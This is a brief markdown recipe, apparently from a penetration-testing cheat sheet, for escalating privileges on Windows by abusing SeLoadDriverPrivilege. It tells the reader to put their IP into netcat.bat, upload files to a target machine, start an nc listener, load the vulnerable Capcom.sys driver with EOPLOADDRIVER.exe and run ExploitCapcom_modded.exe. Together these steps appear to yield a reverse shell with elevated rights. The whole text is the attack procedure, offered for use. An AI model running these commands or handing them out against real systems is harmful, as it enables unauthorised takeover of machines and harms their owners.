# SeLoadDriverPrivilege

1. Edit netcat.bat to add your IP
2. Upload all the files on the Target Machine
3. Start netcat listener
```csharp
rlwrap -cAr nc -lvnp 2222
```
4. Run below commands 
```csharp
.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys
```

```csharp
.\ExploitCapcom_modded.exe
```
